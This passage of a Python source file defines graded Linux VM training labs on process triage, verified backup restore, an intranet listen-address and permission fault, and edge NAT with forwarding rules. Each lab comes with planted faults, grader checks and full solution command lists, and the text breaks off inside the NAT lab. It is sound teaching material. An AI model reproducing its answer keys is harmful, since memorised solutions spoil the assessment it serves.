"""Round-4 real Linux VM labs (v86, the same tools/vm_image image): a slow server (CPU, memory, priority), a restore
from verified backups, a web service that only answers on localhost (bind address, HTTP 403, change backup), edge NAT
with a stateful forward policy proved by packet capture, and a compromised-host triage (evidence first, then contain).
Same format and grader as labs_vm.py; every lab is graded against the real machine state plus the ordered command
history, and every one is *Pending SME review* (added by interactive_labs._install_new_labs)."""
import hashlib

from labs_vm import IMAGE, _m, _prelude
from labs_vm_more import SYSLOG, _h


def _ans(key, value, path):
    """key=value answer line compared as a hash, so the probe the browser receives does not contain the answer."""
    return (f"[ \"$(grep -i '^{key}[[:space:]]*=' {path} | tail -1 | cut -d= -f2- | tr -d ' \\r' | tr 'A-Z' 'a-z' "
            f"| sha256sum | cut -c1-16)\" = {_h(value)} ]")


def _sha(text):
    return hashlib.sha256(text.encode()).hexdigest()


# --------------------------------------------------------------------------------------------- 1: slow server
_PERF_ASK = "/root/SR-6110.txt"
_PERF_SETUP = _prelude("novak-app-04") + SYSLOG + r"""mkdir -p /usr/local/bin /opt/payroll /var/run
cat > /usr/local/bin/thumbgen <<'EOF'
#!/bin/sh
# thumbnail generator. Known bug (vendor ticket VND-88): spins at 100% CPU when its queue is empty.
while :; do :; done
EOF
cat > /opt/payroll/reportgen <<'EOF'
#!/bin/sh
# month-end payroll report - long running and MUST finish today (finance deadline). Progress: /var/log/reportgen.log
n=0
while :; do i=0; while [ $i -lt 4000 ]; do i=$((i+1)); done; n=$((n+1)); echo "batch $n ok" >> /var/log/reportgen.log; done
EOF
cat > /usr/local/bin/cachefill <<'EOF'
#!/bin/sh
# "cache warmer" from a load test (CHG-5121). Holds about 10 MB of RAM and never gives it back.
x=$(head -c 10000000 /dev/zero | tr '\0' c)
while :; do sleep 60; done
EOF
cat > /etc/init.d/S60cachefill <<'EOF'
#!/bin/sh
# cache warmer - load test only (CHG-5121)
case "$1" in
  start) start-stop-daemon -S -b -m -p /var/run/cachefill.pid -x /usr/local/bin/cachefill ;;
  stop)  start-stop-daemon -K -p /var/run/cachefill.pid; rm -f /var/run/cachefill.pid ;;
  *)     echo "Usage: $0 {start|stop}"; exit 1 ;;
esac
EOF
chmod 755 /usr/local/bin/thumbgen /opt/payroll/reportgen /usr/local/bin/cachefill /etc/init.d/S60cachefill
/etc/init.d/S60cachefill start
( setsid /usr/local/bin/thumbgen </dev/null >/dev/null 2>&1 & )
( setsid /opt/payroll/reportgen </dev/null >/dev/null 2>&1 & )
sleep 2
"""
_PID = "ps -o pid,stat,args | grep '[r]eportgen' | grep -v ' Z ' | awk '{print $1}' | head -1"
PERF = {
    "id": "linux-vm-perf",
    "title": "Real Linux VM — CPU & Memory Triage",
    "kind": "vm",
    "blurb": "A real Linux server that really is slow: a process spinning at 100% CPU, a forgotten memory hog started at "
             "boot, and a payroll report that must not be killed. Measure, identify, act with the least disruption, "
             "stop it coming back and write it up — graded inside the VM.",
    "objectives": [
        {"id": "boot", "text": "Boot the VM"},
        {"id": "baseline", "text": "Take a baseline before changing anything: uptime (load average), then free (memory)"},
        {"id": "identify", "text": "Find the top CPU and memory users (top -b -n 1, or ps -o pid,vsz,rss,args)"},
        {"id": "cpu", "text": "Stop the runaway thumbgen process (it is a known vendor bug)"},
        {"id": "keep", "text": "Do NOT kill the payroll reportgen job: lower its priority to nice 10 or more (renice) and leave it running"},
        {"id": "mem", "text": "Stop the cachefill memory hog, then run free again to confirm the memory came back"},
        {"id": "persist", "text": "Stop cachefill coming back at the next boot: disable /etc/init.d/S60cachefill (remove its execute bit; keep the file)"},
        {"id": "notes", "text": "Write /root/SR-6110.txt with cpu=<process that used the CPU> and mem=<process that held the memory>"},
    ],
    "intro": "SR-6110 from finance: \"novak-app-04 is crawling and the payroll report is due today\". This is a real Linux VM "
             "and the faults are really running, so the console itself may feel sluggish until you fix it. Work like an "
             "administrator: measure first, change one thing at a time, and do not kill a job the business needs — make "
             "it wait its turn instead. BusyBox tools: top -b -n 1 (one snapshot), ps -o pid,stat,vsz,rss,args, free, "
             "uptime, kill, killall, renice. A process's nice value is field 19 of /proc/PID/stat.",
    "success_msg": "Server recovered with the least disruption: spinner killed, payroll job still running at lower priority, "
                   "memory hog stopped and disabled at boot, findings written up.",
    "initial_state": {},
    "obj_hints": {
        "boot": ["Start the VM and wait for root@novak-app-04:~#.", "Start VM."],
        "baseline": ["The load average is the run-queue length over 1, 5 and 15 minutes; free shows used and available memory. "
                     "Record them before you change anything so you can prove the fix.", "uptime ; free"],
        "identify": ["top sorts by CPU; ps can print each process's memory (VSZ/RSS).",
                     "top -b -n 1 | head -15 ; ps -o pid,vsz,rss,args"],
        "cpu": ["kill PID sends SIGTERM; killall matches by name.", "killall thumbgen   (or kill <PID from top>)"],
        "keep": ["renice changes the priority of a running process: higher nice = lower priority (10–19 for batch work). "
                 "The STAT column shows N for a niced process.",
                 "renice -n 15 -p $(ps -o pid,args | grep '[r]eportgen' | awk '{print $1}') ; ps -o pid,stat,args | grep reportgen"],
        "mem": ["The init script that started it can also stop it; killall works too. Compare free before and after.",
                "/etc/init.d/S60cachefill stop   (or killall cachefill) ; free"],
        "persist": ["Scripts in /etc/init.d named S* run at boot only when executable. Disable rather than delete, so the "
                    "change is easy to roll back.", "chmod -x /etc/init.d/S60cachefill ; ls -l /etc/init.d/S60cachefill"],
        "notes": ["Use the process names you saw in top.", "printf 'cpu=thumbgen\\nmem=cachefill\\n' > /root/SR-6110.txt"],
    },
    "course_objectives": ["IT-11.3", "IT-11.1", "IT-9.1"],
    "minutes": 30,
    "palette": ["uptime", "free", "top -b -n 1 | head -15", "ps -o pid,stat,vsz,rss,args", "kill ", "killall ", "renice -n 15 -p ",
                "cat /proc/loadavg", "ls -l /etc/init.d", "chmod -x ", "cat /root/SR-6110.txt", "clear"],
    "fallback": ["w11-processes", "linux-shell"],
    "vm": dict(IMAGE, machines=[_m("vm", "novak-app-04", "novak-app-04")], setup={"vm": _PERF_SETUP}),
    "vm_checks": [
        {"id": "boot"},
        {"id": "baseline", "seq": [r"^(uptime|w)\b|loadavg", r"^free\b|meminfo"], "before": r"^(kill|killall|renice)\b|S60cachefill\s+stop",
         "why": "Before you kill or renice anything, record the load (uptime) and then the memory (free)."},
        {"id": "identify", "hist": [r"^top\b|^ps\b.*-o"], "why": "Use top -b -n 1 (or ps -o pid,vsz,rss,args) to find the hogs."},
        {"id": "cpu", "sh": "! ps -o stat,args | grep -v '^Z' | grep -q '[t]humbgen'", "show": "ps -o pid,stat,args | grep '[t]humbgen' | grep -v ' Z ' | head -1",
         "secs": 8, "why": "thumbgen is still running: {v}"},
        {"id": "keep", "sh": f"p=$({_PID}); [ -n \"$p\" ] && [ \"$(awk '{{print $19}}' /proc/$p/stat)\" -ge 10 ]",
         "show": f"p=$({_PID}); [ -n \"$p\" ] && echo \"reportgen pid $p nice $(awk '{{print $19}}' /proc/$p/stat)\" || echo 'reportgen is NOT running - it was killed (restart it: setsid /opt/payroll/reportgen &)'",
         "hist": [r"^renice\b"], "secs": 8, "why": "The payroll job must keep running at nice 10 or more: {v}"},
        {"id": "mem", "sh": "! ps -o stat,args | grep -v '^Z' | grep -q '[c]achefill'", "seq": [r"^(kill|killall)\b|S60cachefill\s+stop", r"^free\b|meminfo"],
         "show": "ps -o pid,stat,vsz,args | grep '[c]achefill' | grep -v ' Z ' | head -1",
         "secs": 8, "why": "Stop cachefill and then run free again to confirm. Still running: {v}"},
        {"id": "persist", "sh": "[ -f /etc/init.d/S60cachefill ] && [ ! -x /etc/init.d/S60cachefill ] && [ -f /usr/local/bin/cachefill ]",
         "show": "ls -l /etc/init.d/S60cachefill 2>&1 | cut -c1-10",
         "why": "/etc/init.d/S60cachefill must stay in place but not be executable (now {v})."},
        {"id": "notes", "sh": _ans("cpu", "thumbgen", _PERF_ASK) + " && " + _ans("mem", "cachefill", _PERF_ASK),
         "show": f"cat {_PERF_ASK} 2>&1 | head -3", "secs": 6, "why": "/root/SR-6110.txt needs cpu=… and mem=… with the right process names (now: {v})."},
    ],
    "solution": {"vm_commands": [
        "uptime", "free", "top -b -n 1 | head -12", "ps -o pid,vsz,rss,args | grep -v '\\['", "killall thumbgen",
        "renice -n 15 -p $(ps -o pid,args | grep '[r]eportgen' | awk '{print $1}')", "ps -o pid,stat,args | grep reportgen",
        "/etc/init.d/S60cachefill stop", "free", "chmod -x /etc/init.d/S60cachefill",
        "printf 'cpu=thumbgen\\nmem=cachefill\\n' > /root/SR-6110.txt", "uptime"]},
}

# --------------------------------------------------------------------------------------------- 2: restore from verified backups
_B15 = {"budget.csv": "line,amount\nstaff,410000\nequipment,52000\n",
        "assumptions.txt": "Budget 2027 assumptions - draft v1\n"}
_B16 = {"budget.csv": "line,amount\nstaff,428500\nequipment,49000\ntraining,12000\n",
        "assumptions.txt": "Budget 2027 assumptions - v2 approved 15 Oct\n",
        "board-notes.txt": "Board pack: present the training line separately.\n"}
_RS_ASK = "/root/RESTORE-6230.txt"


def _write(files, d):
    return "".join(f"cat > {d}/{n} <<'EOF'\n{c}EOF\n" for n, c in files.items())


_RS_SETUP = _prelude("novak-file-03") + SYSLOG + r"""addgroup -g 1500 finance; adduser -D -u 1501 -G finance -h /home/fin fin
mkdir -p /srv/share/finance/budget-2027 /srv/share/hr /backup
cd /srv/share
""" + _write(_B15, "finance/budget-2027") + r"""echo 'q4 forecast 1.0' > finance/2026-q4.csv
echo 'rota week 41' > hr/rota.txt
chown -R fin:finance finance; chmod 750 finance finance/budget-2027; chmod 640 finance/budget-2027/* finance/2026-q4.csv
tar -c -f - finance hr | gzip -9 > /backup/share-20261015-0100.tar.gz
""" + _write(_B16, "finance/budget-2027") + r"""chown fin:finance finance/budget-2027/*; chmod 640 finance/budget-2027/*
echo 'q4 forecast 2.0' > finance/2026-q4.csv; echo 'rota week 42' > hr/rota.txt
tar -c -f - finance hr | gzip -9 > /backup/share-20261016-0100.tar.gz
echo 'rota week 42 (swap: Lee/Ana)' > hr/rota.txt
tar -c -f - finance hr | gzip -9 > /tmp/.full.tgz
cd /backup && sha256sum share-20261015-0100.tar.gz share-20261016-0100.tar.gz > SHA256SUMS
echo "$(sha256sum /tmp/.full.tgz | cut -d' ' -f1)  share-20261017-0100.tar.gz" >> SHA256SUMS
head -c $(( $(wc -c < /tmp/.full.tgz) / 2 )) /tmp/.full.tgz > /backup/share-20261017-0100.tar.gz; rm -f /tmp/.full.tgz
printf 'nightly 01:00 - copy to nas01 - 17 Oct: WARNING nas01 volume full during upload\n' > /backup/README
cd /srv/share; echo 'q4 forecast 2.3 (edited 17 Oct 11:40 by fin)' > finance/2026-q4.csv; chown fin:finance finance/2026-q4.csv
rm -rf finance/budget-2027
logger -t smbd 'fin deleted folder /srv/share/finance/budget-2027 (17 Oct 14:05)'
cd /root
"""
_RS_FILE = "/srv/share/finance/budget-2027/"
RESTORE = {
    "id": "linux-vm-restore",
    "title": "Real Linux VM — Verified Backup Restore",
    "kind": "vm",
    "blurb": "A user deleted a finance folder on a real Linux file server. Three nightly backups exist and one of them is "
             "corrupt. Verify them, pick the newest good copy, restore only what was lost with its owners and "
             "permissions, and leave today's work untouched — graded on the restored files themselves.",
    "objectives": [
        {"id": "boot", "text": "Boot the VM"},
        {"id": "inspect", "text": "Before restoring, verify the backups (sha256sum -c SHA256SUMS in /backup) and list an archive's contents (tar -t)"},
        {"id": "restored", "text": "Restore /srv/share/finance/budget-2027 from the newest backup that passes its checksum"},
        {"id": "perms", "text": "The restored folder and files keep their owner fin:finance and modes (folder 750, files 640)"},
        {"id": "kept", "text": "Do not overwrite today's work: finance/2026-q4.csv and hr/rota.txt keep their current contents"},
        {"id": "verified", "text": "Verify the restore with the user's view: list the restored folder with ls -l after extracting"},
        {"id": "record", "text": "Write /root/RESTORE-6230.txt with used=<backup file you restored from> and bad=<backup file that failed>"},
    ],
    "intro": "SR-6230: \"I deleted the budget-2027 folder by mistake this afternoon — please get it back\" (fin, finance). "
             "Backups run nightly at 01:00 into /backup with a SHA256SUMS file. A real Linux VM with real archives: a "
             "careless restore really overwrites this morning's edits. Note: this BusyBox tar cannot decompress by itself (no -z), so "
             "decompress with zcat and let tar read standard input: zcat FILE | tar -tf - lists, zcat FILE | tar -xf - -C DIR "
             "PATH extracts only PATH into DIR. A safe habit: restore into /tmp/restore first, check it, then copy it back with cp -a.",
    "success_msg": "Restored from the newest good backup with owners and modes intact, nothing else overwritten, and the bad backup reported.",
    "initial_state": {},
    "obj_hints": {
        "boot": ["Start the VM and wait for root@novak-file-03:~#.", "Start VM."],
        "inspect": ["sha256sum -c re-hashes each file listed in SHA256SUMS and says OK or FAILED. Then look inside a good archive.",
                    "cd /backup ; sha256sum -c SHA256SUMS ; zcat share-20261016-0100.tar.gz | tar -tf -"],
        "restored": ["The 17 Oct archive fails its checksum (and is cut short), so the newest good one is 16 Oct. "
                     "Extract only finance/budget-2027.",
                     "mkdir -p /tmp/restore ; zcat /backup/share-20261016-0100.tar.gz | tar -xf - -C /tmp/restore finance/budget-2027 ; "
                     "cp -a /tmp/restore/finance/budget-2027 /srv/share/finance/"],
        "perms": ["tar run as root restores owners and modes; cp -a keeps them. Plain cp does not.",
                  "ls -l /srv/share/finance/budget-2027 ; chown -R fin:finance … ; chmod 750 … ; chmod 640 …/*"],
        "kept": ["Extracting the whole archive over /srv/share replaces newer files with the backup's older copies.",
                 "Only restore finance/budget-2027. If you overwrote them, there is no backup of today's edits — tell the user."],
        "verified": ["Check what the user will see: names, owner, group and modes.", "ls -l /srv/share/finance/budget-2027"],
        "record": ["Write the file names exactly as in /backup.",
                   "printf 'used=share-20261016-0100.tar.gz\\nbad=share-20261017-0100.tar.gz\\n' > /root/RESTORE-6230.txt"],
    },
    "course_objectives": ["IT-12.3", "IT-10.4", "IT-9.1"],
    "minutes": 30,
    "palette": ["cd /backup", "ls -l", "cat SHA256SUMS", "sha256sum -c SHA256SUMS", "zcat ", "| tar -tf -", "| tar -xf - -C /tmp/restore ",
                "cp -a ", "ls -l /srv/share/finance/budget-2027", "cat ", "clear"],
    "fallback": ["ops-backup", "linux-shell"],
    "vm": dict(IMAGE, machines=[_m("vm", "file-03", "novak-file-03")], setup={"vm": _RS_SETUP}),
    "vm_checks": [
        {"id": "boot"},
        {"id": "inspect", "seq": [r"sha256sum\b.*(-c|--check)", r"\btar\s+-?[a-zA-Z]*t[a-zA-Z]*\b"], "before": r"\btar\s+-?[a-zA-Z]*x[a-zA-Z]*\b",
         "why": "Before extracting anything: sha256sum -c SHA256SUMS in /backup, then list an archive with tar -t."},
        {"id": "restored", "sh": " && ".join(f"[ \"$(sha256sum {_RS_FILE}{n} | cut -d' ' -f1)\" = {_sha(c)} ]" for n, c in _B16.items()),
         "show": f"ls {_RS_FILE} 2>&1 | tr '\\n' ' '; grep -h 'v[12]' {_RS_FILE}assumptions.txt 2>/dev/null",
         "why": "budget-2027 is not the 16 Oct version yet (found: {v})."},
        {"id": "perms", "sh": f"ls -ld {_RS_FILE} | grep -q '^drwxr-x--- .* fin *finance ' && [ $(ls -l {_RS_FILE} | grep -c '^-rw-r----- .* fin *finance ') -eq 3 ]",
         "show": f"ls -ld {_RS_FILE} 2>&1 | awk '{{print $1, $3, $4}}'; ls -l {_RS_FILE} 2>/dev/null | awk 'NR>1{{print $1, $3, $4}}' | sort -u | tr '\\n' ' '",
         "why": "Owner and modes after the restore: {v} (want drwxr-x--- fin finance, files -rw-r----- fin finance)."},
        {"id": "kept", "sh": "[ -s /srv/share/finance/budget-2027/budget.csv ] && grep -q 'edited 17 Oct' /srv/share/finance/2026-q4.csv && grep -q 'swap: Lee/Ana' /srv/share/hr/rota.txt",
         "show": "cat /srv/share/finance/2026-q4.csv /srv/share/hr/rota.txt 2>&1 | tr '\\n' ' '",
         "why": "Restore the folder without overwriting today's files (now: {v})."},
        {"id": "verified", "seq": [r"\btar\s+-?[a-zA-Z]*x[a-zA-Z]*\b", r"^(ls\s.*-[a-zA-Z]*l|ll\b).*budget-2027|^(ls\s.*-[a-zA-Z]*l|ll)\s*$"],
         "why": "After extracting, list the restored folder with ls -l."},
        {"id": "record", "sh": _ans("used", "share-20261016-0100.tar.gz", _RS_ASK) + " && " + _ans("bad", "share-20261017-0100.tar.gz", _RS_ASK),
         "show": f"cat {_RS_ASK} 2>&1 | head -3", "why": "/root/RESTORE-6230.txt needs used=… and bad=… with the exact backup file names (now: {v})."},
    ],
    "solution": {"vm_commands": [
        "cd /backup", "ls -l", "sha256sum -c SHA256SUMS", "zcat share-20261017-0100.tar.gz | tar -tf -", "zcat share-20261016-0100.tar.gz | tar -tf -",
        "mkdir -p /tmp/restore", "zcat /backup/share-20261016-0100.tar.gz | tar -xf - -C /tmp/restore finance/budget-2027",
        "cp -a /tmp/restore/finance/budget-2027 /srv/share/finance/", "ls -l /srv/share/finance/budget-2027",
        "printf 'used=share-20261016-0100.tar.gz\\nbad=share-20261017-0100.tar.gz\\n' > /root/RESTORE-6230.txt", "cd"]},
}

# --------------------------------------------------------------------------------------------- 3: web service bound to localhost (2 VMs)
_WEB_HOSTS = "printf '10.40.0.20 app-05 intranet\\n10.40.0.31 ws-31\\n' >> /etc/hosts\n"
_WEB_SRV = _prelude("app-05") + SYSLOG + _WEB_HOSTS + r"""ip link set eth0 up; ip addr add 10.40.0.20/24 dev eth0
apk add -q --no-progress darkhttpd >/dev/null 2>&1
mkdir -p /srv/www/reports /etc/default
echo '<h1>Novak intranet</h1><p>app-05</p>' > /srv/www/index.html
echo '<h1>Q3 report</h1><p>north 41200 / south 38950</p>' > /srv/www/reports/q3.html
chmod 644 /srv/www/index.html; chmod 600 /srv/www/reports/q3.html
cat > /etc/default/intranet <<'EOF'
# intranet web server settings (read by /etc/init.d/intranet)
# CHG-5402 load test: listen on loopback only while testing
ADDR=127.0.0.1
PORT=80
DOCROOT=/srv/www
EOF
cat > /etc/init.d/intranet <<'EOF'
#!/bin/sh
# intranet - darkhttpd serving $DOCROOT as user nobody. Settings: /etc/default/intranet
PIDFILE=/run/intranet/intranet.pid; ADDR=0.0.0.0; PORT=80; DOCROOT=/srv/www
[ -r /etc/default/intranet ] && . /etc/default/intranet
start() { printf 'Starting intranet: '; mkdir -p /run/intranet; chown nobody:nobody /run/intranet
  if darkhttpd "$DOCROOT" --addr "$ADDR" --port "$PORT" --uid nobody --gid nobody --daemon --pidfile "$PIDFILE" --log /var/log/intranet.log >/tmp/.intranet 2>&1
  then echo "OK (listening on $ADDR:$PORT)"; logger -t intranet "started on $ADDR:$PORT"; else echo "FAIL ($(tail -1 /tmp/.intranet))"; return 1; fi; }
stop() { printf 'Stopping intranet: '; start-stop-daemon -K -q -p "$PIDFILE" && { rm -f "$PIDFILE"; echo OK; } || { echo FAIL; return 1; }; }
status() { if [ -f "$PIDFILE" ] && kill -0 "$(cat $PIDFILE)" 2>/dev/null; then echo "intranet is running (pid $(cat $PIDFILE))"; else echo "intranet is stopped"; return 3; fi; }
case "$1" in start|stop|status) "$1";; restart) stop; sleep 1; start;; *) echo "Usage: $0 {start|stop|restart|status}"; exit 1;; esac
EOF
chmod 755 /etc/init.d/intranet; ln -s intranet /etc/init.d/S50intranet
/etc/init.d/intranet start >/dev/null 2>&1
"""
_WEB_WS = _prelude("ws-31") + _WEB_HOSTS + "ip link set eth0 up; ip addr add 10.40.0.31/24 dev eth0\n"
_WEB_ASK = "/root/SR-6340.txt"
_CODE = "curl -s -m 3 -o /dev/null -w '%{http_code}' http://10.40.0.20/reports/q3.html"
WEB = {
    "id": "linux-vm-web",
    "title": "Real Linux VMs — Intranet Web Repair",
    "kind": "vm",
    "blurb": "Two real Linux machines: a user's workstation and the intranet web server. Scope the fault from the "
             "client, prove the service itself is healthy, find the wrong listen address, back up the config before you "
             "change it, and fix a 403 with least privilege — proved from the client over real TCP.",
    "objectives": [
        {"id": "boot", "text": "Boot both VMs (app-05 and ws-31)"},
        {"id": "scope", "text": "Scope it first: from ws-31 request http://app-05/ (it fails), then on app-05 request http://127.0.0.1/ (it works)"},
        {"id": "listen", "text": "app-05: find the listen address (ss -tlnp) and make the service listen on the network (fix /etc/default/intranet, restart the service)"},
        {"id": "backup", "text": "Change control: copy /etc/default/intranet to /etc/default/intranet.bak before you edit it"},
        {"id": "forbidden", "text": "From ws-31, request /reports/q3.html and read the HTTP status code before you change any file permissions"},
        {"id": "perms", "text": "app-05: let the web server read q3.html with least privilege (644, still owned by root, not world-writable)"},
        {"id": "proof", "text": "From ws-31, prove both pages load (HTTP 200) after the fix"},
        {"id": "record", "text": "Write /root/SR-6340.txt on app-05 with bound=<address it was listening on> and code=<status the client first got for q3.html>"},
    ],
    "intro": "SR-6340: \"the intranet is down for everyone\" — reported from ws-31. You have two real Linux VMs on a LAN: the "
             "user's workstation ws-31 (10.40.0.31) and the web server app-05 (10.40.0.20, darkhttpd run by "
             "/etc/init.d/intranet with settings in /etc/default/intranet). Scope before you touch anything: does it fail "
             "for the client only, or on the server too? curl -sv shows the TCP connect and the HTTP status; "
             "curl -s -o /dev/null -w '%{http_code}' URL prints only the status. The web server runs as user nobody.",
    "success_msg": "Intranet back for users: listening on the network with a backed-up config, the report readable with 644, both pages HTTP 200 from the client.",
    "initial_state": {},
    "obj_hints": {
        "boot": ["Start both VMs; use the tabs to switch.", "Start VMs."],
        "scope": ["If the server can reach itself but clients cannot, the program works and the problem is between them "
                  "(listen address, firewall, network).", "on ws-31: curl -sv http://app-05/ ; on app-05: curl -s http://127.0.0.1/"],
        "listen": ["ss -tlnp shows the local address each program listens on. 127.0.0.1 is reachable only from the same machine.",
                   "on app-05: ss -tlnp ; cp /etc/default/intranet /etc/default/intranet.bak ; sed -i 's/^ADDR=127.0.0.1/ADDR=0.0.0.0/' "
                   "/etc/default/intranet ; service intranet restart ; ss -tlnp"],
        "backup": ["A copy of the old file is your rollback plan.", "on app-05: cp /etc/default/intranet /etc/default/intranet.bak"],
        "forbidden": ["404 = not found, 403 = found but not allowed (permissions), 5xx = the server failed.",
                      "on ws-31: curl -s -o /dev/null -w '%{http_code}\\n' http://app-05/reports/q3.html"],
        "perms": ["The server runs as nobody, so 'others' need read. chmod 777 would also let anyone change the report.",
                  "on app-05: ls -l /srv/www/reports ; chmod 644 /srv/www/reports/q3.html"],
        "proof": ["Test as the user would, from the user's machine.", "on ws-31: curl -s http://app-05/ ; curl -s http://app-05/reports/q3.html"],
        "record": ["The address you saw in ss before the fix, and the code curl printed.",
                   "on app-05: printf 'bound=127.0.0.1\\ncode=403\\n' > /root/SR-6340.txt"],
    },
    "course_objectives": ["IT-5.2", "NO-1.3", "IT-9.3", "IT-12.1"],
    "minutes": 35,
    "palette": ["curl -sv http://app-05/", "curl -s -o /dev/null -w '%{http_code}\\n' ", "ss -tlnp", "cat /etc/default/intranet",
                "cp /etc/default/intranet /etc/default/intranet.bak", "sed -i ", "service intranet restart", "ls -l /srv/www/reports",
                "chmod 644 ", "tail /var/log/intranet.log", "clear"],
    "fallback": ["linux-shell", "win-laptop-ports"],
    "vm": dict(IMAGE, machines=[_m("srv", "app-05", "app-05", ["lan"]), _m("ws", "ws-31", "ws-31", ["lan"])],
               setup={"srv": _WEB_SRV, "ws": _WEB_WS},
               net={"segments": ["lan"], "topology": "ws-31 10.40.0.31 ── LAN switch ── app-05 10.40.0.20 (intranet web server, darkhttpd)"}),
    "vm_checks": [
        {"id": "boot"},
        {"id": "scope", "seq": [r"^\[ws\]\s*(curl|wget|tcping|telnet|socat)\b.*(app-05|intranet|10\.40\.0\.20)",
                                r"^\[srv\]\s*(curl|wget)\b.*(127\.0\.0\.1|localhost)"],
         "before": r"^\[srv\].*\b(sed|vi|ed|echo|printf|cat\s*>)\b.*/etc/default/intranet\s*$|^\[srv\].*\bsed\b.*/etc/default/intranet",
         "why": "Before editing the config: request the page from ws-31 (fails), then from app-05 itself on 127.0.0.1 (works)."},
        {"id": "listen", "on": "srv", "sh": "ss -tln | grep -Eq '(0\\.0\\.0\\.0|10\\.40\\.0\\.20|\\*):80 ' && service intranet status && "
                                            "( . /etc/default/intranet; [ \"$ADDR\" != 127.0.0.1 ] )",
         "hist": [r"^\[srv\]\s*(ss|netstat)\b.*-[a-z]*l"],
         "show": "ss -tln | grep ':80 ' | awk '{print $4}' | tr '\\n' ' '; grep '^ADDR' /etc/default/intranet",
         "why": "app-05 must listen on the network from its config (ss -tlnp to see it): {v}"},
        {"id": "backup", "on": "srv", "sh": "grep -q '^ADDR=127.0.0.1' /etc/default/intranet.bak && grep -q '^DOCROOT=/srv/www' /etc/default/intranet.bak",
         "why": "/etc/default/intranet.bak is missing or is not a copy of the original settings."},
        {"id": "forbidden", "seq": [r"^\[ws\]\s*(curl|wget)\b.*reports/q3", r"^\[srv\]\s*chmod\b"],
         "why": "From ws-31, request /reports/q3.html and read the status code before you run chmod on app-05."},
        {"id": "perms", "on": "srv", "sh": "ls -l /srv/www/reports/q3.html | grep -Eq '^-(rw-|r--)r--r-- .* root ' && grep -q 'Q3 report' /srv/www/reports/q3.html",
         "show": "ls -l /srv/www/reports/q3.html | awk '{print $1, $3}'", "why": "q3.html is {v} — the web user (nobody) needs read; nobody else needs write."},
        {"id": "proof", "on": "ws", "sh": f"[ \"$({_CODE})\" = 200 ] && curl -s -m 3 http://10.40.0.20/ | grep -q 'Novak intranet'", "secs": 8,
         "hist": [r"^\[ws\]\s*(curl|wget)\b.*reports/q3"], "show": f"echo q3=$({_CODE})",
         "why": "From ws-31 the pages do not both return 200 yet ({v})."},
        {"id": "record", "on": "srv", "sh": _ans("bound", "127.0.0.1", _WEB_ASK) + " && " + _ans("code", "403", _WEB_ASK),
         "show": f"cat {_WEB_ASK} 2>&1 | head -3", "why": "/root/SR-6340.txt needs bound=… and code=… (now: {v})."},
    ],
    "solution": {"vm_commands": [
        "[ws] curl -sv -m 3 http://app-05/", "[srv] curl -s http://127.0.0.1/", "[srv] ss -tlnp",
        "[srv] cp /etc/default/intranet /etc/default/intranet.bak", "[srv] sed -i 's/^ADDR=127.0.0.1/ADDR=0.0.0.0/' /etc/default/intranet",
        "[srv] service intranet restart", "[srv] ss -tlnp", "[ws] curl -s http://app-05/",
        "[ws] curl -s -o /dev/null -w '%{http_code}\\n' http://app-05/reports/q3.html", "[srv] ls -l /srv/www/reports",
        "[srv] chmod 644 /srv/www/reports/q3.html", "[ws] curl -s http://app-05/reports/q3.html",
        "[srv] printf 'bound=127.0.0.1\\ncode=403\\n' > /root/SR-6340.txt"]},
}

# --------------------------------------------------------------------------------------------- 4: edge NAT + stateful forwarding (2 VMs)
_NAT_NET = {
    "segments": ["lan", "wan"],
    "services": {"name": "internet", "mac": "02:c1:77:00:05:01",
                 "ifaces": [{"seg": "wan", "ip": "203.0.113.1", "bits": 24}, {"seg": "wan", "ip": "203.0.113.10", "bits": 24},
                            {"seg": "wan", "ip": "203.0.113.53", "bits": 24}],
                 "dns": {"domain": "example.com", "records": {"www.example.com": "203.0.113.10", "mail.example.com": "203.0.113.25"}}},
    "topology": "lan-pc 10.5.0.10 ── LAN ── edge-1 (10.5.0.1 · 203.0.113.2) ── ISP / internet: 203.0.113.1 · web 203.0.113.10 · resolver 203.0.113.53",
}
_NAT_RTR = _prelude("edge-1") + SYSLOG + r"""sysctl -qw net.ipv4.ip_forward=1 net.ipv4.conf.all.send_redirects=0 net.ipv4.conf.default.send_redirects=0 net.ipv4.conf.eth0.send_redirects=0
ip link set eth0 up; ip addr add 10.5.0.1/24 dev eth0; ip addr add 203.0.113.2/24 dev eth0; ip route add default via 203.0.113.1
mkdir -p /etc/iptables
iptables -F; iptables -t nat -F; iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -s 10.50.0.0/24 -o eth0 -j MASQUERADE -m comment --comment "LAN to internet (CHG-4410)"
"""
_NAT_PC = _prelude("lan-pc") + "ip link set eth0 up; ip addr add 10.5.0.10/24 dev eth0; ip route add default via 10.5.0.1\n" \
    "echo 'nameserver 203.0.113.53' > /etc/resolv.conf\n"
_NS = "iptables -t nat -S POSTROUTING"
_FS = "iptables -S FORWARD"
NAT = {
    "id": "linux-vm-nat",
    "title": "Real Linux VMs — Edge NAT & Forwarding",
    "kind": "vm",
    "blurb": "Two real Linux machines: a LAN PC and an edge router to a simulated internet that, like the real one, "
             "never answers private addresses. Prove the fault with tcpdump, fix the broken source NAT rule, add a "
             "default-deny stateful forward policy, and verify — real netfilter NAT and conntrack.",
    "objectives": [
        {"id": "boot", "text": "Boot both VMs (lan-pc and edge-1)"},
        {"id": "symptom", "text": "Isolate it first: ping 203.0.113.10 from lan-pc (fails), then from edge-1 (works), before changing the NAT table"},
        {"id": "capture", "text": "edge-1: capture the PC's ping with tcpdump and see that it leaves with its private source address (10.5.0.10)"},
        {"id": "nat", "text": "edge-1: fix source NAT — the LAN 10.5.0.0/24 is masqueraded (or SNAT to 203.0.113.2), and the rule for the wrong subnet is gone"},
        {"id": "forward", "text": "edge-1: FORWARD policy DROP, accept new traffic from 10.5.0.0/24 and ESTABLISHED,RELATED replies"},
        {"id": "reach", "text": "lan-pc: ping 203.0.113.10 works and the internet sees the router's public address 203.0.113.2"},
        {"id": "dns", "text": "lan-pc: resolve www.example.com through the NAT (nslookup or drill, server 203.0.113.53)"},
        {"id": "saved", "text": "edge-1: save the final rules, nat table included, to /etc/iptables/rules-save"},
    ],
    "intro": "NET-2290: \"since the router change last night, nobody on the LAN can reach the internet\". You have two real "
             "Linux VMs: lan-pc (10.5.0.10) and edge-1, a Linux router with 10.5.0.1 on the LAN and 203.0.113.2 toward the "
             "ISP. The internet in this page behaves like the real one: it has no route back to private 10.x addresses. "
             "Forwarding is already on. Change CHG-4410 added a NAT rule — check it with iptables -t nat -L -n -v "
             "(the packet counters say whether a rule ever matched). To capture while you ping: on edge-1 run "
